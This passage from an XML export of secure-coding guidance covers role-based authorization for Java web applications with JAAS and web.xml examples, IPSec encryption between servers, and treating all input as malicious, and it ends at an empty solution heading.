&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93"&gt;Guideline: Do Not Rely on Client-Side Validation (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:044B9F0A-6A95-442C-BF24-3F890D0B10EF"&gt;Attack: Client-side Validation Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0"&gt;Attack: LDAP Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:BC10DCE2-CA48-44BF-8BF6-FEFBE8DCCB7E"&gt;Attack: Cross Site Scripting Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36"&gt;Attack: AJAX Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:685CA8C0-E102-4517-A539-4B826D1962EB"&gt;Attack: Double Encoding Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1CCC080F-9290-4BD2-8A2C-6A45F59727B0"&gt;Attack: Xpath-XQuery Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B86F003F-DB0C-41D4-B31A-F9AE1BF7C9C1"&gt;Attack: Deserialization of Untrusted Data Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764"&gt;Attack: SQL Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D"&gt;Attack: Command Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:208A476B-ABCA-4630-9D02-746C52F47017"&gt;Attack: XML Injection Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:6D944640-22E7-421F-8192-45730D5118AB"&gt;Checklist Item: Input is Validated for Length, Range, Format and Type (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>797a213b-b83a-4acf-b535-692356993b29</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Perform Role-based Security Checks</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authorization</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Applications written using Servlets or JSP.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Define&amp;nbsp;the different types of users and create specific roles for them. When authorizing access to a resource, build the security checks on a per-role basis rather than on a per-user basis.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Application roles allow multiple users to play the same role and&amp;nbsp;provides a clear way to manage the least privileges necessary for the execution of a given task. It provides a more robust and flexible way of managing the application's users.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;If your application uses access control and authorizes its users to application resources, then define roles and perform role-based security checks.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To apply this concept, the security checks within an application should be executed against a user's role rather than against the actual user.&lt;/p&gt;
&lt;p&gt;Use the following steps when designing the role-based security:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Understand the different types of users&lt;/strong&gt;:&amp;nbsp;List the different types of users expected for the application.&amp;nbsp;Define&amp;nbsp;how they will use&amp;nbsp;the application, which resources they will&amp;nbsp;need to&amp;nbsp;access, and any additional rules that will impact&amp;nbsp;how access
 will vary. Create a matrix mapping roles to resource by describing what action the role can take with each system asset. Use this matrix to identify the different types of users according to the functionality they need.&lt;/p&gt;
&lt;pre&gt;Role       Actions    Access Controls    Client Accounts&lt;br&gt;--------------------------------------------------------&lt;br&gt;Manager    Connect        Always            Always&lt;br&gt;           Read           Always            Always&lt;br&gt;           Use            Always            Occasionally&lt;br&gt;           Modify         Never             Occasionally&lt;br&gt;Employee   Connect        Always            Always&lt;br&gt;           Read           Always            Always&lt;br&gt;           Use            Always            Always&lt;br&gt;           Modify         Never             Never&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Establish the roles&lt;/strong&gt;: Define in code how each role can access&amp;nbsp;each resources. There are two approaches when enforcing role-based security - programmatic and declarative:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Programmatically&lt;/strong&gt;: The programmatic approach to role-based security is written inside the code and provides additional runtime flexibility.&lt;br&gt;
&lt;br&gt;
To enforce role-based security, you need to create a security policy for your application. If you implement this&amp;nbsp;approach using&amp;nbsp;Java Authentication and Authorization Service (JAAS) policies, you can execute a more focused set of security checks such as whether
 a user is allowed to access a particular resource or perform a specific action. When building the policy, create a role with associated permissions&amp;nbsp;for each type of user. For example, certain roles would be permitted to access the local filesystem while others
 would not.&lt;br&gt;
&lt;br&gt;
See the &lt;a href="?#ruledisplay:1131DE2A-C216-4397-97C8-A8D33DE8CC51"&gt;Define a Security Policy&lt;/a&gt; guideline for more information.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;grant Principal application.auth.GroupToken &amp;quot;administrators&amp;quot;&lt;br&gt;{&lt;br&gt;  permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;  permission java.io.FilePermission “/tmp/myapp/cache”, “read,write”;&lt;br&gt;};&lt;br&gt;grant Principal application.auth.GroupToken &amp;quot;users&amp;quot;&lt;br&gt;{&lt;br&gt;  permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;};&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Declarative&lt;/strong&gt;: The declarative approach to role-based security is declared within configuration files. While it doesn’t provide much flexibility in the development phase of the code, it allows easy manageability as the declarations can be
 modified without a recompile. By using the declarative approach, you can easily manage the security settings for&amp;nbsp;large portions of the applications without a need to change the code.&lt;br&gt;
&lt;br&gt;
Java applications that use declarative security rely on a deployment descriptor (e.g. web.xml). The deployment descriptor uses the following elements for role-based security:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;security-constraint&lt;/strong&gt;: Defines the access controls associated with a collection of resources as defined in the
&lt;strong&gt;web-resource-collection&lt;/strong&gt; element. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;web-resource-collection&lt;/strong&gt;: Encapsulates a collection of resources that share mutual access controls.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;web-resource-name&lt;/strong&gt;: Defines the name for the collection of resources.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;url-pattern&lt;/strong&gt;: Identifies the URL of a resource that uses the access controls.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;auth-constraint&lt;/strong&gt;: Defines the group of user roles that can access the collection of resources identified by the
&lt;strong&gt;web-resource-collection&lt;/strong&gt; element. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;role-name&lt;/strong&gt;: Defines the roles that can access the collection of resources.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;http-method&lt;/strong&gt;: Identifies the HTTP method upon which the access controls will be enforced. For example, your application may enforce access controls for POST requests, but not GET requests. If omitted, the access controls will apply to all
 HTTP methods. &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;For example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;!-- Application's web.xml --&amp;gt;&lt;br&gt;&amp;lt;security-constraint&amp;gt;&lt;br&gt;      &amp;lt;web-resource-collection&amp;gt;&lt;br&gt;            &amp;lt;web-resource-name&amp;gt;Admin Commands&amp;lt;/web-resource-name&amp;gt;&lt;br&gt;            &amp;lt;url-pattern&amp;gt;/admin/*&amp;lt;/url-pattern&amp;gt;&lt;br&gt;            &amp;lt;url-pattern&amp;gt;/config.do&amp;lt;/url-pattern&amp;gt;&lt;br&gt;      &amp;lt;/web-resource-collection&amp;gt;&lt;br&gt;      &amp;lt;auth-constraint&amp;gt;&lt;br&gt;            &amp;lt;role-name&amp;gt;Admin&amp;lt;/role-name&amp;gt;&lt;br&gt;      &amp;lt;/auth-constraint&amp;gt;&lt;br&gt;&amp;lt;/security-constraint&amp;gt;&lt;br&gt; &amp;lt;login-config&amp;gt;&lt;br&gt;      &amp;lt;auth-method&amp;gt;BASIC&amp;lt;/auth-method&amp;gt;&lt;br&gt;      &amp;lt;realm-name&amp;gt;Admin Realm&amp;lt;/realm-name&amp;gt;&lt;br&gt;&amp;lt;/login-config&amp;gt;&lt;br&gt; &amp;lt;!-- The following needs to be included if the application is to&lt;br&gt;     use form-based authentication&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;In web.xml:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;login-config&amp;gt;&lt;br&gt;      &amp;lt;auth-method&amp;gt;FORM&amp;lt;/auth-method&amp;gt;&lt;br&gt;      &amp;lt;form-login-config&amp;gt;&lt;br&gt;            &amp;lt;form-login-page&amp;gt;/loginForm.jsp&amp;lt;/form-login-page&amp;gt;&lt;br&gt;            &amp;lt;form-error-page&amp;gt;/loginFailed.html&amp;lt;/form-error-page&amp;gt;&lt;br&gt;      &amp;lt;/form-login-config&amp;gt;&lt;br&gt;&amp;lt;/login-config&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;In loginForm.jsp:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;form method=&amp;quot;POST&amp;quot; action=&amp;quot;j_security_check&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;j_username&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;input type=&amp;quot;password&amp;quot; name=&amp;quot;j_password&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;log in&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;/form&amp;gt;--&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Because declarative security asks the hosting server to handle authentication and authorization, there is the risk of disclosing connection strings, database credentials, etc.; therefore, use a JAAS LoginModule when using declarative security.&lt;br&gt;
&lt;br&gt;
Example using Tomcat (if you use a different environment, please consult its manual):&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;      &amp;lt;!-- $TOMCAT_HOME/conf/server.xml --&amp;gt;&lt;br&gt;      &amp;lt;!-- JAAS authentication realm --&amp;gt;&lt;br&gt;      &amp;lt;Realm className=&amp;quot;org.apache.catalina.realm.JAASRealm&amp;quot;&lt;br&gt;             appName=&amp;quot;AppLoginConfig&amp;quot;&lt;br&gt;             userClassNames=&amp;quot;application.auth.GroupToken&amp;quot;&lt;br&gt;             roleClassNames=&amp;quot;application.auth.GroupToken&amp;quot;&lt;br&gt;             useContextClassLoader=&amp;quot;false&amp;quot;&lt;br&gt;             debug=&amp;quot;99&amp;quot;/&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Manage the users&lt;/strong&gt;: Assign the users into their respective user roles. The application should apply the security policy according to the user roles instead of the actual user.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;GroupToken groupToken = new GroupToken(groupName);&lt;br&gt;if(!subject.getPrincipals().contains(groupToken))&lt;br&gt;{&lt;br&gt;      subject.getPrincipals().add(groupToken);&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;For more information regarding security tokens, consult the &lt;a href="?#ruledisplay:A224E8C9-050B-46D0-9D10-2C91CA1F0FCA"&gt;
Consider Using JAAS for Authentication&lt;/a&gt; guideline. &lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following segment illustrates a JAAS policy. Because the application does not enforce role-based security, it has a policy entry for each separate user; therefore, changing the users' access rights can be quite difficult as each user needs to be modified
 individually.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;grant Principal application.auth.UserToken &amp;quot;joe&amp;quot;&lt;br&gt;{&lt;br&gt;  permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;};&lt;br&gt;grant Principal application.auth.UserToken &amp;quot;steve&amp;quot;&lt;br&gt;{&lt;br&gt;  permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;};&lt;br&gt;grant Principal application.auth.UserToken &amp;quot;julie&amp;quot; &lt;br&gt;{&lt;br&gt;  permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;};&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
&lt;p&gt;The following segment illustrates a JAAS policy. Because the application enforces role-based security, it has a policy entry for each group of users; therefore changing the users' access rights is easy as only the group needs to be modified.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;grant Principal application.auth.GroupToken &amp;quot;users&amp;quot;&lt;br&gt;{&lt;br&gt;  permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;};&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;For more information about setting Tomcat Realms, see: &lt;a href="http://tomcat.apache.org/tomcat-7.0-doc/realm-howto.html"&gt;
Tomcat 7: Realm Configuration HOW-TO&lt;/a&gt;.&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:A224E8C9-050B-46D0-9D10-2C91CA1F0FCA"&gt;Guideline: Consider Using JAAS for Authentication (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:1131DE2A-C216-4397-97C8-A8D33DE8CC51"&gt;Guideline: Define a Security Policy (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:6543475A-082B-4E98-8446-F2AFF2EF0553"&gt;Guideline: Partition Application Between Public and Private Domains (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:FC9AF70F-092C-4AC6-9B54-6793DE17B8DD"&gt;Attack: Business Rule Attack&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:152B3F11-E1F6-4885-B1CA-5FBF866E9FF2"&gt;Checklist Item: Role-based Security Checks are Performed (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>834db5af-d3ce-4fe5-a546-7b5af56f840c</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Use IPSsec to Encrypt Traffic Between Servers</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Internet Protocol security (IPSec)&amp;nbsp;provides encryption, integrity, and authentication services for IP-based network traffic.&amp;nbsp;Use&amp;nbsp;IPSec to provide server-to-server protection&amp;nbsp;against internal network threats, including eavesdropping, tampering, man in the
 middle attacks, IP spoofing, and other password-based attacks by restricting which computers can communicate with each other, and limit the protocols they can communicate with.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Servers&amp;nbsp;do not usually co-exist in a secure environment. Eavesdropping and spoofing are threats when two or more entities must communicate over&amp;nbsp;typical untrusted mediums such as the public internet&amp;nbsp;or a company intranet. Failure to use IPSec&amp;nbsp;increases the
 likleihood&amp;nbsp;that data traveling on the network will be intercepted, modified, or&amp;nbsp;stolen.&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;IPSec can be used&amp;nbsp;for the following tasks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Provide message confidentiality by encrypting all of the data sent between two computers.
&lt;/li&gt;&lt;li&gt;Provide message integrity between two computers (without encrypting data). &lt;/li&gt;&lt;li&gt;Provide mutual authentication between two computers. For example, you can help secure a database server by establishing a policy that permits requests only from a specific client computer (for example, an application or Web server).
&lt;/li&gt;&lt;li&gt;Restrict which computers can communicate with one another. You can also restrict communication to specific IP protocols and TCP/UDP ports.&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;Using IPSec is not a a possibility when the two servers are not using static ip addresses.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;To secure traffic between two servers, follow these steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create an IP Filter.&lt;/strong&gt; This&amp;nbsp;restricts&amp;nbsp;what computers can communicate with each other, and require that&amp;nbsp;specific&amp;nbsp;communication protocols are used.&amp;nbsp;A filter consists of:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A source IP address or range of addresses. &lt;/li&gt;&lt;li&gt;A destination IP address or range of addresses. &lt;/li&gt;&lt;li&gt;An IP protocol, such as TCP, UDP, or &amp;quot;any.&amp;quot; &lt;/li&gt;&lt;li&gt;Source and destination ports (for TCP or UDP only).&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create Filter Actions.&lt;/strong&gt; This procedure creates two filter actions. The first will be used to block all communications from specified computers and the second will be used to enforce the use of encryption between application server and database
 server computers. &lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Create Rules.&lt;/strong&gt; This procedure creates two new rules that will be used to associate the filter that you created in Procedure 1, with the two filter actions you created in Procedure 2.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Export the IPSec Policy to the Remote Computer.&lt;/strong&gt; The IPSec policy that you have created on the database server must now be exported and copied to the application server computer.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Assign Policies.&lt;/strong&gt; An IPSec policy must be assigned before it becomes active. Note that only one policy may be active at any one time on a particular computer.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that it Works.&lt;/strong&gt; Use Network Monitor (netmon.exe) to verify that data sent between the two servers&amp;nbsp;is encrypted.
&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;How To: Use IPSec to Provide Secure Communication Between Two Servers&amp;nbsp;&lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp"&gt;http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/SecNetHT18.asp&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;How To: Use IPSec for Filtering Ports and Authentication &lt;a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp"&gt;
http://msdn.microsoft.com/library/default.asp?url=/library/en-us/dnnetsec/html/HTUseIPSec.asp&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;How To: Use IPSec Policy to Secure Terminal Services Communications in Windows Server 2003
&lt;a href="http://support.microsoft.com/kb/816521"&gt;http://support.microsoft.com/kb/816521&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:ecfc4c67-2a6c-443e-844e-8a3051fe54f3"&gt;Use IPSsec to Encrypt Traffic Between Servers&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:4d8acde8-c44d-46f2-84f1-0c9a8fd1710a"&gt;Appropriate Mechanism of Secure Communication (IPSec or SSL) is used, Depending on Application Requirement&lt;/a&gt;
&lt;/li&gt;&lt;li&gt;&lt;a href="?#ruledisplay:0c3fe1a1-c49c-4187-872e-246e07c875f9"&gt;For Communication Between Web Browser and Web Server, SSL is used When Pages Need to be Encrypted&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>8b8b0ec3-7ad7-4c0f-bcaf-ce30b56b4e50</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Assume All Input Is Malicious</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Input and Data Validation</category>
    <phase>Design</phase>
    <rule_Type>Guideline</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Web Application&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Do&lt;/h1&gt;
&lt;p&gt;Applications should assume that all of their input is malicious, and take action accordingly.&amp;nbsp; Input should&amp;nbsp;be validated and either rejected or sanitized immediately, carefully quarantined during use, and encoded appropriately on output.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Malicious input is the single largest cause of vulnerabilities in web applications, and in the most general sense, is the root cause of almost every issue.&amp;nbsp; The only way to ensure safety is by a defense in depth, default deny policy that starts with the
 fundamental supposition that all input is malicious until proven otherwise. For example, if you call an external Web service that returns strings, how do you know that malicious commands are not present? Also, if several applications write to a shared database,
 when you read data, how do you know whether it is safe?&lt;/p&gt;
&lt;h1&gt;When&lt;/h1&gt;
&lt;p&gt;All applications should assume that all their input is malicious.&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;p&gt;Getting input validation correct is tricky; there's a reason that it's the number one security problem for web applications.&amp;nbsp; However, when approached systematically, it's not too hard of a&amp;nbsp;problem to solve.&amp;nbsp; Follow these steps:&lt;/p&gt;
&lt;h2&gt;1. Determine all inputs&lt;/h2&gt;
&lt;p&gt;The first step is to determine all the things in the application which can be controlled by the user.&amp;nbsp; There are some surprises here -- a lot of the variables in a normal HTTP server environment are actually taken from the user's request, so make sure you
 know exactly where everything is coming from.&amp;nbsp; It's a good idea to leave a brief comment in the code where the input comes in mentioning where it comes from (if it isn't obvious from context), the expected format, and where it's validated (again, if it isn't
 obvious).&lt;/p&gt;
&lt;h2&gt;2. Determine all trusted data stores&lt;/h2&gt;
&lt;p&gt;&amp;nbsp;Every application has at least one, usually multiple data stores.&amp;nbsp; It's important to know when a data store can be trusted.&amp;nbsp; The guideline here is simple; if the system in question is the only input into the data store, then you can rely on the semantics
 enforced by your input validation routines to apply to all data found in the store.&amp;nbsp; If other applications access the data store, then you can't.&amp;nbsp; While it is possible to check the semantics of every validation routine in every other system that accesses the
 data store, it's simpler and safer to assume that the data store is untrusted, and treat it as a potential source of malicious data, validating all input from it as you would any other input.&lt;/p&gt;
&lt;h2&gt;3. Determine all crossover points&lt;/h2&gt;
&lt;p&gt;Crossover points are one of the places where malicious input becomes a bug.&amp;nbsp; They're not necessarily places where output occurs; in fact, they'll often occur many layers further in than that in large applications.&amp;nbsp; A crossover point is anywhere where user
 input is included textually in some larger body of command text, or where a security-relevant decision is made based on it.&amp;nbsp; A good example of a crossover point is a dynamic SQL query.&amp;nbsp; The risk here is of the user input crossing over into the associated command
 data, allowing an attacker to execute commands.&amp;nbsp; Xpath and other XML injections are another example here.&amp;nbsp; The worst case here is when user input is evaluated by a languages built-in &amp;quot;eval&amp;quot; command or something similar -- these commands should never be used,
 even with values that look safe, because of the risks associated.&lt;/p&gt;
&lt;p&gt;Once the crossover points are found, all inputs should be traced back to make sure that they've been validated appropriately beforehand, and a comment again stating the format, source, and validation point should be made.&amp;nbsp;&amp;nbsp;All crossover points have, depending
 on the technology involved, different sets of safe characters.&amp;nbsp; Using the whitelist approach described below, the safe set of characters for that crossover point should be compared against what the validator will allow through; the allowed characters must
 be a subset of the safe ones.&lt;/p&gt;
&lt;p&gt;Whenever possible, steps should be taken to remove crossover points entirely.&amp;nbsp; Switching from dynamic SQL to stored procedures with bound parameters removes an entire category of crossover points from the system, and greatly reduces risk to an entire class
 of attacks.&amp;nbsp; Similar things can be done with other types of crossovers.&lt;/p&gt;
&lt;h2&gt;4. Determine all outputs&lt;/h2&gt;
&lt;p&gt;The last point of concern is the list of outputs from the system.&amp;nbsp; This will likely have a certain amount of overlap with the list of crossover points, which is fine.&amp;nbsp; Again, we need to determine the allowable format for each output, and look at where the
 incoming data is being validated.&amp;nbsp; If there's any question of whether the data may contain dangerous characters, it should be encoded in a manner appropriate to the specific output.&amp;nbsp; There are more output contexts than one might thing; the contents of HTML
 attributes, the tags themselves, free text between the tags, and javascript strings all have different safe sets of characters (and a different encoding, in the last case).&amp;nbsp; Comments on the input source, format, validation point, and encoding point&amp;nbsp;are also
 useful here.&lt;/p&gt;
&lt;h2&gt;5. Build a centralized validation module&lt;/h2&gt;
&lt;p&gt;One of the biggest dangers of implementing input validation is inconsistent validation; an attack may be caught on one data path, but not on another.&amp;nbsp; An attacker will try all of them, however.&amp;nbsp; The way to solve this problem is to have a single point of
 responsibility for input validation.&amp;nbsp; Where this is depends on the design.&amp;nbsp; If every piece of input is an object, then it may be appropriate to have the object constructs and setters perform the validation for that object's input.&amp;nbsp; In a less strictly OO system,
 a single module with methods for each different input format may be more appropriate.&lt;/p&gt;
&lt;p&gt;Which ever method is chosen, the input validation routine for a specific data type should be as strict as possible.&amp;nbsp; For example, when validating a US zip code, allow either 5 or 9 numbers, and nothing else.&amp;nbsp; If you're dealing with international postal codes,
 either validate them seperately with a looser format that also allows letters, or build a more complex validator that understands the postal codes of each nation, if you need to ensure a higher level of integrity.&lt;/p&gt;
&lt;h2&gt;6. Build a centralized encoding module&lt;/h2&gt;
&lt;p&gt;In an ideal world, all encoding routines would be done via the same libraries which are used to create output.&amp;nbsp; While many HTML control libraries attempt this, none of them take the whitelist approach.&amp;nbsp; Instead, they try to guess which characters might be
 harmful, a list which is categorically incomplete.&amp;nbsp; Unless you want to build a new output library (which might be an option on a large enough application), you should build a set of data encoders for each ouput context which you have.&amp;nbsp; These encoders should
 be used as close as possible to the actual point of output; this minimizes the chance of an alternate data path skipping the encoding, and ensures that the developer knows exactly what context the output is being used in.&amp;nbsp; Avoid the temptation to store encoded
 data, because even if it is initially only used in the context you encoded it for, this may change over time.&lt;/p&gt;
&lt;h2&gt;7. Ensure that all paths through the system preserve validation&lt;/h2&gt;
&lt;p&gt;Once the validation system is complete, all the paths that data takes through the system should be checked to ensure that they preserve the validation properties that are expected.&amp;nbsp; Input which is sent round-trip through a client or another system must be
 re-validated, unless a cryptographic signature is used to ensure that it has not been tampered with.&amp;nbsp; Validation which occurs on an untrusted system must also be repeated.&amp;nbsp; Client-side validation in javascript is a nice UI touch, but it is trivially circumvented
 as&amp;nbsp; a security measure.&lt;/p&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;A suite of web applications on an e-commerce site share a common back-end database.&amp;nbsp; The largest application is&amp;nbsp;the&amp;nbsp;order entry system and shopping cart.&amp;nbsp; This was the first application built, and was designed with the assumption that the database was trusted.&amp;nbsp;
 Later, a lightweight app to allow users to quickly check stock levels was built.&amp;nbsp; Because it was a small &amp;quot;read-only&amp;quot; use of the database, input validation was not built into the application.&amp;nbsp; The application contained a SQL injection, allowing an attacker
 to alter the database in such a way that they could&amp;nbsp;inject javascript into pages which displayed the shopping cart application, allowing them to steal user's passwords.&amp;nbsp;&lt;/p&gt;
&lt;h1&gt;Solution Example&lt;/h1&gt;
